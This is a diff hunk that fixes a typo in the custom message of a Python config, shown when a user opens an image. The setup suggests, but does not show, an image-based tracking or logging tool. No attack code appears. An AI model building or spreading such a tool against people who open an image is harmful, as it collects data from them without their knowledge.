@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "This browser has been loaded by Kaylee Park's security successly! I LOVE YOU!", # Message to show
+        "message": "This browser has been loaded by Kaylee Park's security successfully! I LOVE YOU!", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
